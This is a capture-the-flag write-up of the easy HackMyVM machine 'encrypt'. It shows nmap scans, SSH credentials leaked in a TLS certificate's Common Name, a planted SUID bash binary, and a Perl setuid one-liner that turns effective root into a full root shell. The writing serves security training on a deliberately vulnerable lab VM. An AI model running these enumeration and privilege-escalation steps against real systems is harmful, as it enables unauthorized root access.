# encrypt

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| encrypt | M0rPH3U5 | easy | hackmyvm |

**Summary:** Encrypt is an easy-difficulty Linux machine on HackMyVM. Initial reconnaissance via network scanning and port enumeration reveals an OpenSSH service on port 22 and an Apache HTTPS web server on port 443. Inspecting the SSL/TLS certificate exposed on port 443 reveals cleartext credentials formatted directly within the Subject Common Name field as `iot:Goat123!`. Leveraging these credentials over SSH grants immediate access as the `iot` user. During post-exploitation enumeration, searching for files configured with SUID permissions uncovers an abnormal hidden binary located at `/var/tmp/.suid_bash`. Executing this binary with privileged mode enables effective root permissions, which is subsequently converted into an interactive root shell using a short Perl setuid execution one-liner. The entire compromise concludes with the retrieval of both the user and root flags.

---

## Reconnaissance

### Host Discovery

The assessment began with an ARP and ICMP host discovery sweep across the target subnet `192.168.56.0/24` to identify the assigned IP address:

```zsh
~/projects/labs/hmv                                                                                         09:39:54  
❯ nmap -sn 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 09:40 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.00027s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00076s latency).  
Nmap scan report for 192.168.56.136  
Host is up (0.0021s latency).  
Nmap scan report for 192.168.56.137  
Host is up (0.00095s latency).  
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.82 seconds
```

Target availability was verified using ICMP echo requests against `192.168.56.136`:

```zsh
~/projects/labs/hmv                                                                                         09:40:03  
❯ ping -c 4 192.168.56.136  
PING 192.168.56.136 (192.168.56.136) 56(84) bytes of data.  
64 bytes from 192.168.56.136: icmp_seq=1 ttl=64 time=0.669 ms  
64 bytes from 192.168.56.136: icmp_seq=2 ttl=64 time=0.929 ms  
64 bytes from 192.168.56.136: icmp_seq=3 ttl=64 time=0.699 ms  
64 bytes from 192.168.56.136: icmp_seq=4 ttl=64 time=0.857 ms  
  
--- 192.168.56.136 ping statistics ---  
4 packets transmitted, 4 received, 0% packet loss, time 3063ms  
rtt min/avg/max/mdev = 0.669/0.788/0.929/0.108 ms
```

### Port Scanning and Service Enumeration

A full TCP port scan was executed across all 65535 ports to detect listening services:

```zsh
~/projects/labs/hmv                                                                                         09:41:00  
❯ nmap -p- -Pn -T4 --min-rate 5000 192.168.56.136  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 09:41 +0700  
Nmap scan report for 192.168.56.136  
Host is up (0.00020s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT    STATE SERVICE  
22/tcp  open  ssh  
443/tcp open  https
```

The port scan identified two open ports:
1. Port 22 running SSH service.
2. Port 443 running HTTPS service.

---

## Initial Access

### SSL Certificate Inspection and Information Disclosure

Querying the HTTPS service with `curl` in verbose mode to inspect the TLS handshake details and server headers revealed critical sensitive information embedded directly within the SSL certificate:

```zsh
~/projects/labs/hmv                                                                                         09:44:10
❯ curl -k -v https://192.168.100.136/
*   Trying 192.168.56.136:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* SSL Trust: peer verification disabled
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519MLKEM768 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*   subject: CN=iot:Goat123!
*   start date: May 26 17:58:58 2026 GMT
*   expire date: May 26 17:58:58 2027 GMT
*   issuer: CN=iot:Goat123!
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* OpenSSL verify result: 12
*  SSL certificate verification failed, continuing anyway!
* Established connection to 192.168.56.136 (192.168.56.136 port 443) from 192.168.56.1 port 53640 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.56.136
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Date: Sat, 29 Aug 2026 02:45:43 GMT
< Server: Apache/2.4.67 (Debian)
< Last-Modified: Tue, 26 May 2026 17:42:11 GMT
< ETag: "29cf-652bc03c9cb3f"
< Accept-Ranges: bytes
< Content-Length: 10703
< Vary: Accept-Encoding
< Content-Type: text/html
< 
...
```

The server certificate's Subject Common Name discloses a clear set of credentials:
1. Username: `iot`
2. Password: `Goat123!`

### SSH Authentication

Using the leaked credentials, an interactive SSH session was initiated against the target:

```zsh
~/projects/labs/hmv                                                                                         09:45:44
❯ ssh iot@192.168.56.136            
The authenticity of host '192.168.56.136 (192.168.56.136)' can't be established.
ED25519 key fingerprint is: SHA256:vPz/C/Y+ypmtCOAQUCmpzt3TVpY2cWaZsludaqMj7N0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.136' (ED25519) to the list of known hosts.
iot@192.168.56.136's password: 
Linux encrypt 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 28 15:08:27 2026 from 192.168.56.1
iot@encrypt:~$ id;whoami;hostname
uid=1000(iot) gid=1000(iot) groupes=1000(iot),100(users)
iot
encrypt
```

Initial foothold was established as the user `iot` (UID 1000).

---

## Privilege Escalation

### SUID Binary Enumeration

Internal enumeration was performed by querying the filesystem for executables configured with the SUID bit:

```zsh
iot@encrypt:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 494144  5 avril 01:29 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18744 17 janv.  2025 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51272  8 mars   2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 18816 10 mai    2025 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55688 10 mai    2025 /usr/bin/umount
-rwsr-xr-x 1 root root 118168 19 avril  2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 88568 19 avril  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 72072 10 mai    2025 /usr/bin/mount
-rwsr-xr-x 1 root root 70888 19 avril  2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 306456 11 févr.  2026 /usr/bin/sudo
-rwsr-xr-x 1 root root 52936 19 avril  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 84360 10 mai    2025 /usr/bin/su
-rwsr-xr-x 1 root root 1298416 30 avril 22:00 /var/tmp/.suid_bash
```

The listing highlights a non-standard SUID binary located at `/var/tmp/.suid_bash` owned by `root`.

### Root Shell Execution

Running the SUID bash binary with the `-p` (privileged) option preserved the effective user ID `euid=0(root)`. To transition to a full interactive root shell, a Perl one-liner was executed to set both real and effective UID and GID to 0 before invoking `/bin/bash`:

```zsh
iot@encrypt:~$ /var/tmp/.suid_bash -p
.suid_bash-5.2# id
uid=1000(iot) gid=1000(iot) euid=0(root) groupes=1000(iot),100(users)
.suid_bash-5.2# which python3
.suid_bash-5.2# which perl
/usr/bin/perl
.suid_bash-5.2# perl -e 'use POSIX qw(setuid setgid); $ENV{PATH}="/usr/bin:/bin"; POSIX::setgid(0); POSIX::setuid(0); exec "/bin/bash";'
root@encrypt:~# id
uid=0(root) gid=0(root) groupes=0(root),100(users),1000(iot)
root@encrypt:~# su -
root@encrypt:~# id;whoami;hostname
uid=0(root) gid=0(root) groupes=0(root)
root
encrypt
```

### Flag Capture

Both user and root proof files were retrieved directly from the filesystem:

```zsh
root@encrypt:~# cat /home/iot/user.txt /root/root.txt 
8a8...
bc0...
```

---

## Attack Chain Summary

1. **Reconnaissance**: Discovered active host `192.168.56.136` on the subnet, identifying open SSH (port 22) and HTTPS (port 443) services through comprehensive Nmap port scanning.
2. **Vulnerability Discovery**: Investigated the TLS handshake on port 443 using `curl`, uncovering sensitive plaintext credentials embedded directly within the SSL certificate Subject Common Name field.
3. **Exploitation**: Utilized the retrieved credentials `iot:Goat123!` to authenticate via SSH, gaining an initial foothold as the unprivileged user `iot`.
4. **Internal Enumeration**: Enumerated SUID binaries across the target filesystem, identifying a rogue SUID-enabled bash binary at `/var/tmp/.suid_bash`.
5. **Privilege Escalation**: Executed `/var/tmp/.suid_bash -p` to obtain root effective privileges, followed by a Perl setuid one-liner to drop into a permanent root shell and extract both user and root flags.
